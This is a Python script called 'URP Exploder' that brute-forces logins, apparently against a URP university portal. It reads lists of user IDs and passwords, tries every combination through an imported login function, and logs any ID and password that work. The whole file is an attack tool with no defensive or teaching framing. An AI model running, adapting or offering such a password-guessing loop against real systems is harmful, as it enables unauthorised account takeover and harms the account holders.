""" URP Exploder"""
# import requests
# import lxml
import sys

sys.path.append("..")
import urp_login as login


def guess_password(id, guess_pw):
    pass


if __name__ == '__main__':
    folder = 'URP_exploder/'
    file_of_id = open(folder + 'id_list.txt', 'r')
    id_list = []
    for i in file_of_id:
        id_list.append(i.strip())
    file_of_id.close()

    file_of_pw = open(folder + 'pw_list.txt', 'r')
    pw_list = []
    for x in file_of_pw:
        print(x)
        pw_list.append(x.strip())
    file_of_pw.close()

    print(pw_list)

    log_file = open(folder + 'log.txt', 'w+')
    log_file.write('init\n')

    for id in id_list:
        log_file.write('start explode for id=' + id + '\n')
        for pw in pw_list:
            try:
                rtn = login.urp_login(id, pw)
            except Exception as e:
                log_file.write('for id= ' + id + ' pw= ' + pw + ' is Exception\n' + str(e) + '\n')
                rtn = False
            if rtn is False:
                log_file.write('for id= ' + id + ' pw= ' + pw + ' is failed\n')
            else:
                log_file.write('FOR ID= ' + id + ' PW= ' + pw + ' IS SUCCESSED\n')
                break
